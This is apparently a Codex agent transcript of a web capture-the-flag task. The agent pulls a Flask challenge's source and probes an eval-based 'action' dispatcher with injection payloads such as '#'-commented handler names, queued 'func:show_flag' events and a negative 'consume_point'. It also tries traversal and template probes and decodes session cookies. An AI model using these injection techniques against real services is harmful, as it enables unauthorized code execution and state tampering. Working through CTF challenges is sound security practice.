@@ -1,0 +1,600 @@
+Reading additional input from stdin...
+OpenAI Codex v0.145.0
+--------
+workdir: /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+model: gpt-5.6-sol
+provider: openai
+approval: never
+sandbox: danger-full-access
+reasoning effort: medium
+reasoning summaries: none
+session id: 019fb436-ab77-7b80-b3ef-79ce008cff7a
+--------
+user
+针对目标独立分析 action 参数解析/注入可能，测试低风险 payload，寻找模板、文件读取、表达式或路由绕过。给出 FEASIBLE/INFEASIBLE 和证据。
+
+---
+完成后将结果写入 /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52/branch_result_branch_002.md，格式:
+## Branch Result
+direction: action_parser
+subagent_id: branch_002
+status: FEASIBLE | INFEASIBLE
+### 发现
+(列出关键发现)
+### 命令和结果
+(关键命令及其输出)
+### 结论
+(可行/不可行 + 建议)
+warning: `--dangerously-bypass-hook-trust` is enabled. Enabled hooks may run without review for this invocation.
+warning: `--dangerously-bypass-hook-trust` is enabled. Enabled hooks may run without review for this invocation.
+codex
+我会先恢复目标上下文与现有侦察结果，再围绕 `action` 的解析边界做低风险探测；结论与可复现实证会按指定格式写入结果文件。
+exec
+/bin/bash -lc "pwd && rg --files -g 'board.md' -g 'progress.md' -g 'strategies/**' -g '"'!node_modules'"' -g '"'!vendor'"' | sort && sed -n '1,240p' board.md 2>/dev/null && sed -n '1,240p' progress.md 2>/dev/null && sed -n '1,260p' strategies/web.md 2>/dev/null" in /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+ exited 2 in 0ms:
+/home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+board.md
+progress.md
+# Board
+
+## Ideas
+
+| ID | Status | Idea | Result | Updated |
+|----|--------|------|--------|---------|
+
+## Memory
+
+| ID | Kind | Content | Source | Updated |
+|----|------|---------|--------|---------|
+## Target
+- Type: web
+- URL: http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com:80/d5afe1f66147e857
+- Background: 
+- Start Time: 2026-07-31T02:07:09+08:00
+
+## Current Phase
+recon / source discovery
+
+## Next Steps
+1. 保持 session 请求 `action:index;True%23False` 获取源码
+2. 主线根据源码定位积分/钻石逻辑漏洞
+3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
+
+## Key Artifacts
+- /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+- board.md: 当前为空，无既有 ideas/memory
+- /tmp/ctf_initial.txt: 初始响应；目标无尾斜杠时 308 到同路径加 `/`
+- /tmp/ctf_home.txt: 主页响应
+- 技术栈线索: 前置 Server 为 openresty，错误页风格疑似 Flask/Werkzeug
+- 主页状态: session 初始 0 diamonds / 3 points
+- 入口: `?action:index;True%23False` 源码、`view;shop` 商店、`view;reset` 重置、`view;index`
+- 当前目录及上两层未找到 branch.py，首次 spawn 未启动；需从 `/home/stw/ctf-agent` 定位
+- branch.py 已定位: `/home/stw/ctf-agent/branch.py`
+- 异步试探已启动: branch_001=shop_logic, branch_002=action_parser
+
+## Flags Found
+(无)
+
+hook: PostToolUse
+hook: PostToolUse Completed
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_96d15a99bc52/progress.md
+diff --git a/challenges/manual_web_96d15a99bc52/progress.md b/challenges/manual_web_96d15a99bc52/progress.md
+index b3a7b97587832c8ccee40495a861bc8c4b0fb0cd..338bdfb2af13836f8323776bbbe810aa292d16cd
+--- a/challenges/manual_web_96d15a99bc52/progress.md
++++ b/challenges/manual_web_96d15a99bc52/progress.md
+@@ -5,12 +5,13 @@
+ - Start Time: 2026-07-31T02:07:09+08:00
+ 
+ ## Current Phase
+-recon / source discovery
++recon / source discovery (branch_002 正在独立测试 action 参数解析)
+ 
+ ## Next Steps
+ 1. 保持 session 请求 `action:index;True%23False` 获取源码
+ 2. 主线根据源码定位积分/钻石逻辑漏洞
+ 3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
++4. branch_002: 获取 action 源码响应并测试模板、文件读取、表达式及路由边界
+ 
+ ## Key Artifacts
+ - /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+
+diff --git a/challenges/manual_web_96d15a99bc52/progress.md b/challenges/manual_web_96d15a99bc52/progress.md
+index b3a7b97587832c8ccee40495a861bc8c4b0fb0cd..338bdfb2af13836f8323776bbbe810aa292d16cd
+--- a/challenges/manual_web_96d15a99bc52/progress.md
++++ b/challenges/manual_web_96d15a99bc52/progress.md
+@@ -5,12 +5,13 @@
+ - Start Time: 2026-07-31T02:07:09+08:00
+ 
+ ## Current Phase
+-recon / source discovery
++recon / source discovery (branch_002 正在独立测试 action 参数解析)
+ 
+ ## Next Steps
+ 1. 保持 session 请求 `action:index;True%23False` 获取源码
+ 2. 主线根据源码定位积分/钻石逻辑漏洞
+ 3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
++4. branch_002: 获取 action 源码响应并测试模板、文件读取、表达式及路由边界
+ 
+ ## Key Artifacts
+ - /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+
+exec
+/bin/bash -lc "sed -n '1,300p' /home/stw/ctf-agent/strategies/web.md; printf '\\n--- initial ---\\n'; sed -n '1,220p' /tmp/ctf_initial.txt 2>/dev/null; printf '\\n--- home ---\\n'; sed -n '1,280p' /tmp/ctf_home.txt 2>/dev/null; printf '\\n--- workdir files ---\\n'; rg --files | sort" in /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+ succeeded in 0ms:
+# Web 题攻击流程
+
+## 侦察阶段 (5-10min)
+
+1. curl 探测目标，识别技术栈 (Server header、X-Powered-By、Cookie 特征)
+2. 端口扫描: `nmap -sV -p- <host>` (或快速 `nmap -sV <host>`)
+3. 目录扫描: `ffuf -u <url>/FUZZ -w common.txt -mc 200,301,302,403`
+4. 识别所有入口点 (GET/POST 参数、API 端点、上传点、登录框)
+5. 发现 2+ 攻击向量时，调 `branch.py spawn` 并行试探
+
+## 验证阶段 (每个向量 3-5min)
+
+- 选最高优先级向量全力推进
+- 单次失败不换方向
+- 同一命令参数微调不超 3 次
+- 同类操作连续 3 次无新发现 -> 换方向
+
+## 利用阶段 (充分投入)
+
+- 对确认漏洞深入利用
+- 拿到 RCE 先读 flag: `cat /flag*`、`find / -name "flag*"`、`env | grep -i flag`
+- 发现 flag 立即输出到 progress.md 的 Flags Found 段
+
+## 常见攻击面清单
+
+- SQL 注入: 联合查询 / 盲注 / 时间盲注 / 堆叠注入 / 二次注入
+- XSS: 反射 / 存储 / DOM (CTF 中通常用于窃取 cookie 或打 bot)
+- SSTI: {{7*7}} / ${7*7} / <%= 7*7 %> 测试不同模板引擎
+- 文件上传: 绕过扩展名/MIME/内容检查，getshell
+- 文件包含: LFI/RFI，读源码或日志getshell
+- 命令注入: ; | || && ` $() 反引号绕过
+- SSRF: 内网探测 / 读文件 / 打 Redis / gopher 协议
+- 反序列化: PHP (__wakeup/__destruct) / Java / Python pickle
+- 弱认证: 默认密码 / JWT 伪造 / session 固定
+- 逻辑漏洞: 越权 / 条件竞争 / 参数篡改
+
+--- initial ---
+HTTP/1.1 308 Permanent Redirect
+Content-Length: 347
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Thu, 30 Jul 2026 18:07:31 GMT
+Keep-Alive: timeout=4
+Location: http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com/d5afe1f66147e857/
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com/d5afe1f66147e857/">http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com/d5afe1f66147e857/</a>.  If not click the link.
+--- home ---
+HTTP/1.1 200 OK
+Content-Length: 272
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Thu, 30 Jul 2026 18:07:51 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=.eJyrVsrJT1eyiq5WUkhSslKKDPczSAy3LPXPzSmNcg8z8TeIykjy8MvxhNJKtTroKvOiCqIiks0Tw02zoyLSbZVqY3WU8kpz4zNLUnOLlawMdJQK8jPzSoBM41oAbrYi7w.amuS9w.qa73geciKOnpqbsANSPfqSvMtpc; HttpOnly; Path=/
+Vary: Cookie
+
+[INFO] you have 0 diamonds, 3 points now.<br /><a href="./?action:index;True%23False">View source code</a><br /><a href="./?action:view;shop">Go to e-shop</a><br /><a href="./?action:view;reset">Reset</a><br /><a href="./?action:view;index">Go back to index.html</a><br />
+--- workdir files ---
+board.md
+branch_001.log
+branch_002.log
+branch_state.json
+codex.log
+dead_ends.md
+guidance.md
+hermes.log
+monitor_state.json
+progress.md
+
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_96d15a99bc52/progress.md b/challenges/manual_web_96d15a99bc52/progress.md
+index b3a7b97587832c8ccee40495a861bc8c4b0fb0cd..338bdfb2af13836f8323776bbbe810aa292d16cd
+--- a/challenges/manual_web_96d15a99bc52/progress.md
++++ b/challenges/manual_web_96d15a99bc52/progress.md
+@@ -5,12 +5,13 @@
+ - Start Time: 2026-07-31T02:07:09+08:00
+ 
+ ## Current Phase
+-recon / source discovery
++recon / source discovery (branch_002 正在独立测试 action 参数解析)
+ 
+ ## Next Steps
+ 1. 保持 session 请求 `action:index;True%23False` 获取源码
+ 2. 主线根据源码定位积分/钻石逻辑漏洞
+ 3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
++4. branch_002: 获取 action 源码响应并测试模板、文件读取、表达式及路由边界
+ 
+ ## Key Artifacts
+ - /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+
+codex
+已确认入口是 Flask 风格的单参数分发器，`action` 以分号承载操作与参数。接下来我会固定同一会话，对源码泄露入口和异常输入做差异对照，重点观察状态码、响应体与是否发生副作用。
+exec
+/bin/bash -lc "target='http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com/d5afe1f66147e857/'; jar='/tmp/branch002.cookies'; curl -sS --max-time 15 -c \""'$jar" "$target" -o /tmp/b002_base.html; curl -sS --max-time 15 -b "$jar" -c "$jar" -D /tmp/b002_source.headers --get --data-urlencode '"'action=index;True#False' \""'$target" -o /tmp/b002_source.html; wc -c /tmp/b002_base.html /tmp/b002_source.html; sed -n '"'1,80p' /tmp/b002_source.headers; sed -n '1,260p' /tmp/b002_source.html" in /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_96d15a99bc52/progress.md b/challenges/manual_web_96d15a99bc52/progress.md
+index b3a7b97587832c8ccee40495a861bc8c4b0fb0cd..338bdfb2af13836f8323776bbbe810aa292d16cd
+--- a/challenges/manual_web_96d15a99bc52/progress.md
++++ b/challenges/manual_web_96d15a99bc52/progress.md
+@@ -5,12 +5,13 @@
+ - Start Time: 2026-07-31T02:07:09+08:00
+ 
+ ## Current Phase
+-recon / source discovery
++recon / source discovery (branch_002 正在独立测试 action 参数解析)
+ 
+ ## Next Steps
+ 1. 保持 session 请求 `action:index;True%23False` 获取源码
+ 2. 主线根据源码定位积分/钻石逻辑漏洞
+ 3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
++4. branch_002: 获取 action 源码响应并测试模板、文件读取、表达式及路由边界
+ 
+ ## Key Artifacts
+ - /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+
+ succeeded in 167ms:
+272 /tmp/b002_base.html
+272 /tmp/b002_source.html
+544 total
+HTTP/1.1 200 OK
+Content-Length: 272
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Thu, 30 Jul 2026 18:08:57 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=.eJyrVsrJT1eyiq5WUkhSslKKDPczSAy3LPXPzSmNcg8z8TeIykjy8MvxhNJKtTroKvOiCqIiks0Tw02zoyLSbbGooMCsWB2lvNLc-MyS1NxiJSsDHaWC_My8EiDTuBYAD6A6dA.amuTOQ.iqbVu3khbw_u6y-NJ5chaOiRTX4; HttpOnly; Path=/
+Vary: Cookie
+
+[INFO] you have 0 diamonds, 3 points now.<br /><a href="./?action:index;True%23False">View source code</a><br /><a href="./?action:view;shop">Go to e-shop</a><br /><a href="./?action:view;reset">Reset</a><br /><a href="./?action:view;index">Go back to index.html</a><br />
+exec
+/bin/bash -lc "target='http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com/d5afe1f66147e857/'; jar='/tmp/branch002.cookies'; for q in 'action:index;True%23False' 'action:view;shop' 'action:view;index' 'action:index;True' 'action:index;False'; do key="'$(printf '"'%s' \""'$q" | tr -c '"'[:alnum:]' '_'); code="'$(curl -sS --max-time 15 -b "$jar" -c "$jar" -w '"'%{http_code}' \""'$target?$q" -o "/tmp/b002_${key}.html"); bytes=$(wc -c < "/tmp/b002_${key}.html"); first=$(head -c 180 "/tmp/b002_${key}.html" | tr '"'\\n' ' '); printf '%-32s code=%s bytes=%s body=%s\\n' \""'$q" "$code" "$bytes" "$first"; done' in /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_96d15a99bc52/progress.md b/challenges/manual_web_96d15a99bc52/progress.md
+index b3a7b97587832c8ccee40495a861bc8c4b0fb0cd..338bdfb2af13836f8323776bbbe810aa292d16cd
+--- a/challenges/manual_web_96d15a99bc52/progress.md
++++ b/challenges/manual_web_96d15a99bc52/progress.md
+@@ -5,12 +5,13 @@
+ - Start Time: 2026-07-31T02:07:09+08:00
+ 
+ ## Current Phase
+-recon / source discovery
++recon / source discovery (branch_002 正在独立测试 action 参数解析)
+ 
+ ## Next Steps
+ 1. 保持 session 请求 `action:index;True%23False` 获取源码
+ 2. 主线根据源码定位积分/钻石逻辑漏洞
+ 3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
++4. branch_002: 获取 action 源码响应并测试模板、文件读取、表达式及路由边界
+ 
+ ## Key Artifacts
+ - /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+
+ succeeded in 670ms:
+action:index;True%23False        code=200 bytes=14370 body=<a href="./?action:index;True%23True">Download this .py file</a><br /><a href="./?action:view;index">Go back to index.html</a><br />from&nbsp;flask&nbsp;import&nbsp;Flask,&nbsp;ses
+action:view;shop                 code=200 bytes=168 body=[INFO] you have 0 diamonds, 3 points now.<br /><a href="./?action:buy;1">Buy a diamond (1 point)</a><br /><a href="./?action:view;index">Go back to index.html</a><br />
+action:view;index                code=200 bytes=272 body=[INFO] you have 0 diamonds, 3 points now.<br /><a href="./?action:index;True%23False">View source code</a><br /><a href="./?action:view;shop">Go to e-shop</a><br /><a href="./?acti
+action:index;True                code=404 bytes=13 body=404 NOT FOUND
+action:index;False               code=404 bytes=13 body=404 NOT FOUND
+
+exec
+/bin/bash -lc "target='http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com/d5afe1f66147e857/'; jar='/tmp/branch002.cookies'; curl -sS --max-time 15 -b \""'$jar" -D /tmp/b002_download.headers "$target?action:index;True%23True" -o /tmp/b002_download.bin; file /tmp/b002_download.bin; wc -c /tmp/b002_download.bin; sed -n '"'1,80p' /tmp/b002_download.headers; python3 -c 'import html,pathlib; print(html.unescape(pathlib.Path(\"/tmp/b002_action_index_True_23False.html\").read_text()))' | sed 's/<br *\\/>/\\n/g' | sed -n '1,320p'" in /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_96d15a99bc52/progress.md b/challenges/manual_web_96d15a99bc52/progress.md
+index b3a7b97587832c8ccee40495a861bc8c4b0fb0cd..338bdfb2af13836f8323776bbbe810aa292d16cd
+--- a/challenges/manual_web_96d15a99bc52/progress.md
++++ b/challenges/manual_web_96d15a99bc52/progress.md
+@@ -5,12 +5,13 @@
+ - Start Time: 2026-07-31T02:07:09+08:00
+ 
+ ## Current Phase
+-recon / source discovery
++recon / source discovery (branch_002 正在独立测试 action 参数解析)
+ 
+ ## Next Steps
+ 1. 保持 session 请求 `action:index;True%23False` 获取源码
+ 2. 主线根据源码定位积分/钻石逻辑漏洞
+ 3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
++4. branch_002: 获取 action 源码响应并测试模板、文件读取、表达式及路由边界
+ 
+ ## Key Artifacts
+ - /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+
+ succeeded in 107ms:
+<a href="./?action:index;True%23True">Download this .py file</a>
+<a href="./?action:view;index">Go back to index.html</a>
+from flask import Flask, session, request, Response
+import urllib
+
+app = Flask(__name__)
+app.secret_key = '*********************'  # censored
+url_prefix = '/d5afe1f66147e857'
+
+
+def FLAG():
+    return '*********************'  # censored
+
+
+def trigger_event(event):
+    session['log'].append(event)
+    if len(session['log']) > 5:
+        session['log'] = session['log'][-5:]
+    if type(event) == type([]):
+        request.event_queue += event
+    else:
+        request.event_queue.append(event)
+
+
+def get_mid_str(haystack, prefix, postfix=None):
+    haystack = haystack[haystack.find(prefix)+len(prefix):]
+    if postfix is not None:
+        haystack = haystack[:haystack.find(postfix)]
+    return haystack
+
+
+class RollBackException:
+    pass
+
+
+def execute_event_loop():
+    valid_event_chars = set(
+        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
+    resp = None
+    while len(request.event_queue) > 0:
+        # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
+        event = request.event_queue[0]
+        request.event_queue = request.event_queue[1:]
+        if not event.startswith(('action:', 'func:')):
+            continue
+        for c in event:
+            if c not in valid_event_chars:
+                break
+        else:
+            is_action = event[0] == 'a'
+            action = get_mid_str(event, ':', ';')
+            args = get_mid_str(event, action+';').split('#')
+            try:
+                event_handler = eval(
+                    action + ('_handler' if is_action else '_function'))
+                ret_val = event_handler(args)
+            except RollBackException:
+                if resp is None:
+                    resp = ''
+                resp += 'ERROR! All transactions have been cancelled. <br />'
+                resp += '<a href="./?action:view;index">Go back to index.html</a><br />'
+                session['num_items'] = request.prev_session['num_items']
+                session['points'] = request.prev_session['points']
+                break
+            except Exception, e:
+                if resp is None:
+                    resp = ''
+                # resp += str(e) # only for debugging
+                continue
+            if ret_val is not None:
+                if resp is None:
+                    resp = ret_val
+                else:
+                    resp += ret_val
+    if resp is None or resp == '':
+        resp = ('404 NOT FOUND', 404)
+    session.modified = True
+    return resp
+
+
+@app.route(url_prefix+'/')
+def entry_point():
+    querystring = urllib.unquote(request.query_string)
+    request.event_queue = []
+    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:
+        querystring = 'action:index;False#False'
+    if 'num_items' not in session:
+        session['num_items'] = 0
+        session['points'] = 3
+        session['log'] = []
+    request.prev_session = dict(session)
+    trigger_event(querystring)
+    return execute_event_loop()
+
+# handlers/functions below --------------------------------------
+
+
+def view_handler(args):
+    page = args[0]
+    html = ''
+    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(
+        session['num_items'], session['points'])
+    if page == 'index':
+        html += '<a href="./?action:index;True%23False">View source code</a><br />'
+        html += '<a href="./?action:view;shop">Go to e-shop</a><br />'
+        html += '<a href="./?action:view;reset">Reset</a><br />'
+    elif page == 'shop':
+        html += '<a href="./?action:buy;1">Buy a diamond (1 point)</a><br />'
+    elif page == 'reset':
+        del session['num_items']
+        html += 'Session reset.<br />'
+    html += '<a href="./?action:view;index">Go back to index.html</a><br />'
+    return html
+
+
+def index_handler(args):
+    bool_show_source = str(args[0])
+    bool_download_source = str(args[1])
+    if bool_show_source == 'True':
+
+        source = open('eventLoop.py', 'r')
+        html = ''
+        if bool_download_source != 'True':
+            html += '<a href="./?action:index;True%23True">Download this .py file</a><br />'
+            html += '<a href="./?action:view;index">Go back to index.html</a><br />'
+
+        for line in source:
+            if bool_download_source != 'True':
+                html += line.replace('&', '&amp;').replace('\t', '&nbsp;'*4).replace(
+                    ' ', '&nbsp;').replace('<', '&lt;').replace('>', '&gt;').replace('\n', '<br />')
+            else:
+                html += line
+        source.close()
+
+        if bool_download_source == 'True':
+            headers = {}
+            headers['Content-Type'] = 'text/plain'
+            headers['Content-Disposition'] = 'attachment; filename=serve.py'
+            return Response(html, headers=headers)
+        else:
+            return html
+    else:
+        trigger_event('action:view;index')
+
+
+def buy_handler(args):
+    num_items = int(args[0])
+    if num_items <= 0:
+        return 'invalid number({}) of diamonds to buy<br />'.format(args[0])
+    session['num_items'] += num_items
+    trigger_event(['func:consume_point;{}'.format(
+        num_items), 'action:view;index'])
+
+
+def consume_point_function(args):
+    point_to_consume = int(args[0])
+    if session['points'] < point_to_consume:
+        raise RollBackException()
+    session['points'] -= point_to_consume
+
+
+def show_flag_function(args):
+    flag = args[0]
+    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
+    return 'You naughty boy! ;) <br />'
+
+
+def get_flag_handler(args):
+    if session['num_items'] >= 5:
+        # show_flag_function has been disabled, no worries
+        trigger_event('func:show_flag;' + FLAG())
+    trigger_event('action:view;index')
+
+
+if __name__ == '__main__':
+    app.run(debug=False, host='0.0.0.0')
+
+
+codex
+源码已给出关键约束：`eval(action + "_handler")` 前虽有字符白名单，但 `#` 也被允许，因此可在 `action` 名中注释掉强制后缀。我要验证两件事：能否直接调用非 handler 全局函数，以及能否借 `trigger_event` 把原本禁止作为入口的 `func:` 事件注入队列。
+exec
+/bin/bash -lc "target='http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com/d5afe1f66147e857/'; jar='/tmp/branch002_safe.cookies'; curl -sS --max-time 15 -c \""'$jar" "$target" -o /dev/null; : > /tmp/b002_matrix.txt; i=0; for q in '"'func:show_flag;PROBE' 'action:show_flag_function%23;PROBE' 'action:trigger_event%23;action:view;shop' 'action:trigger_event%23;func:show_flag;PROBE' 'action:str%23;A%23B' 'action:index;True%23False%23..%2F..%2Fetc%2Fpasswd' 'action:view;%7B%7B7%2A7%7D%7D'; do i="'$((i+1)); code=$(curl -sS --max-time 15 -b "$jar" -c "$jar" -w '"'%{http_code}' \""'$target?$q" -o "/tmp/b002_m$i.body"); bytes=$(wc -c < "/tmp/b002_m$i.body"); sha=$(sha256sum "/tmp/b002_m$i.body" | cut -d'"' ' -f1); body="'$(head -c 220 "/tmp/b002_m$i.body" | tr '"'\\n' ' '); printf '%s | HTTP %s | %s bytes | sha256=%s | %s\\n' \""'$q" "$code" "$bytes" "$sha" "$body" | tee -a /tmp/b002_matrix.txt; done' in /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_96d15a99bc52/progress.md b/challenges/manual_web_96d15a99bc52/progress.md
+index b3a7b97587832c8ccee40495a861bc8c4b0fb0cd..338bdfb2af13836f8323776bbbe810aa292d16cd
+--- a/challenges/manual_web_96d15a99bc52/progress.md
++++ b/challenges/manual_web_96d15a99bc52/progress.md
+@@ -5,12 +5,13 @@
+ - Start Time: 2026-07-31T02:07:09+08:00
+ 
+ ## Current Phase
+-recon / source discovery
++recon / source discovery (branch_002 正在独立测试 action 参数解析)
+ 
+ ## Next Steps
+ 1. 保持 session 请求 `action:index;True%23False` 获取源码
+ 2. 主线根据源码定位积分/钻石逻辑漏洞
+ 3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
++4. branch_002: 获取 action 源码响应并测试模板、文件读取、表达式及路由边界
+ 
+ ## Key Artifacts
+ - /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+
+ succeeded in 907ms:
+func:show_flag;PROBE | HTTP 200 | 272 bytes | sha256=414ea1e91f10088e6bac4e5e0bc0826b4beb222e2053bf6655720fbc5e8ef2a3 | [INFO] you have 0 diamonds, 3 points now.<br /><a href="./?action:index;True%23False">View source code</a><br /><a href="./?action:view;shop">Go to e-shop</a><br /><a href="./?action:view;reset">Reset</a><br /><a href=".
+action:show_flag_function%23;PROBE | HTTP 200 | 26 bytes | sha256=9e93d02b38509da250756c6e9fb1ec40c1e61b9aee7b258514f6c47ca9068c09 | You naughty boy! ;) <br />
+action:trigger_event%23;action:view;shop | HTTP 200 | 168 bytes | sha256=4f854917794fa4b7af6a64664e0e3e399aeb2bb423ab2e42a37c5f3779a67d6a | [INFO] you have 0 diamonds, 3 points now.<br /><a href="./?action:buy;1">Buy a diamond (1 point)</a><br /><a href="./?action:view;index">Go back to index.html</a><br />
+action:trigger_event%23;func:show_flag;PROBE | HTTP 200 | 26 bytes | sha256=9e93d02b38509da250756c6e9fb1ec40c1e61b9aee7b258514f6c47ca9068c09 | You naughty boy! ;) <br />
+action:str%23;A%23B | HTTP 200 | 10 bytes | sha256=03d856e68a2482e34227a824aab23fe3801efae02ea3e8feedde2f1e08c09904 | ['A', 'B']
+action:index;True%23False%23..%2F..%2Fetc%2Fpasswd | HTTP 404 | 13 bytes | sha256=343ec86626daf26791b7dc90a2031bb93daae8f0dae1cd45b7345736ddf48752 | 404 NOT FOUND
+action:view;%7B%7B7%2A7%7D%7D | HTTP 404 | 13 bytes | sha256=343ec86626daf26791b7dc90a2031bb93daae8f0dae1cd45b7345736ddf48752 | 404 NOT FOUND
+
+exec
+/bin/bash -lc "target='http://1f0ae21f183656d74cdb112b.http-ctf2.dasctf.com/d5afe1f66147e857/'; jar='/tmp/branch002_exploit.cookies'; curl -sS --max-time 15 -c \""'$jar" "$target" -o /tmp/b002_e0.body; for spec in '"'e1|action:trigger_event%23;func:consume_point;-100' 'e2|action:buy;5' 'e3|action:get_flag;x'; do name="'${spec%%|*}; q=${spec#*|}; code=$(curl -sS --max-time 15 -b "$jar" -c "$jar" -D "/tmp/b002_${name}.headers" -w '"'%{http_code}' \""'$target?$q" -o "/tmp/b002_${name}.body"); printf '"'%s %s HTTP=%s body=' \""'$name" "$q" "$code"; head -c 320 "/tmp/b002_${name}.body" | tr '"'\\n' ' '; printf '\\n'; done; cookie="'$(awk '"'"'$6=="session"{print $7}'"' \""'$jar" | tail -n1); SESSION_COOKIE="$cookie" python3 - <<'"'PY'
+import os,base64,zlib,json
+c=os.environ['SESSION_COOKIE']
+p=c.split('.')[1] if c.startswith('.') else c.split('.')[0]
+raw=base64.urlsafe_b64decode(p+'='*(-len(p)%4))
+if c.startswith('.'):
+    raw=zlib.decompress(raw)
+print(json.dumps(json.loads(raw),ensure_ascii=False,indent=2))
+PY" in /home/stw/ctf-agent/challenges/manual_web_96d15a99bc52
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_96d15a99bc52/progress.md b/challenges/manual_web_96d15a99bc52/progress.md
+index b3a7b97587832c8ccee40495a861bc8c4b0fb0cd..338bdfb2af13836f8323776bbbe810aa292d16cd
+--- a/challenges/manual_web_96d15a99bc52/progress.md
++++ b/challenges/manual_web_96d15a99bc52/progress.md
+@@ -5,12 +5,13 @@
+ - Start Time: 2026-07-31T02:07:09+08:00
+ 
+ ## Current Phase
+-recon / source discovery
++recon / source discovery (branch_002 正在独立测试 action 参数解析)
+ 
+ ## Next Steps
+ 1. 保持 session 请求 `action:index;True%23False` 获取源码
+ 2. 主线根据源码定位积分/钻石逻辑漏洞
+ 3. 稍后检查 branch_001(shop_logic) 与 branch_002(action_parser)
++4. branch_002: 获取 action 源码响应并测试模板、文件读取、表达式及路由边界
+ 
+ ## Key Artifacts
+ - /home/stw/ctf-agent/strategies/web.md: 已读取 Web 攻击流程
+
+ succeeded in 415ms:
+e1 action:trigger_event%23;func:consume_point;-100 HTTP=404 body=404 NOT FOUND
+e2 action:buy;5 HTTP=200 body=ERROR! All transactions have been cancelled. <br /><a href="./?action:view;index">Go back to index.html</a><br />
+e3 action:get_flag;x HTTP=200 body=[INFO] you have 0 diamonds, 3 points now.<br /><a href="./?action:index;True%23False">View source code</a><br /><a href="./?action:view;shop">Go to e-shop</a><br /><a href="./?action:view;reset">Reset</a><br /><a href="./?action:view;index">Go back to index.html</a><br />
+{
+  "log": [
+    {
+      " b": "YWN0aW9uOnRyaWdnZXJfZXZlbnQjO2Z1bmM6Y29uc3VtZV9wb2ludDstMTAw"
+    },
+    {
+      " b": "YWN0aW9uOmJ1eTs1"
+    },
+    [
+      {
+        " b": "ZnVuYzpjb25zdW1lX3BvaW50OzU="
+      },
+      {
+        " b": "YWN0aW9uOnZpZXc7aW5kZXg="
+      }
+    ],
+    {
+      " b": "YWN0aW9uOmdldF9mbGFnO3g="
+    },
+    {
+      " b": "YWN0aW9uOnZpZXc7aW5kZXg="
+    }
+  ],
+  "num_items": 0,
+  "points": 3
+}
+
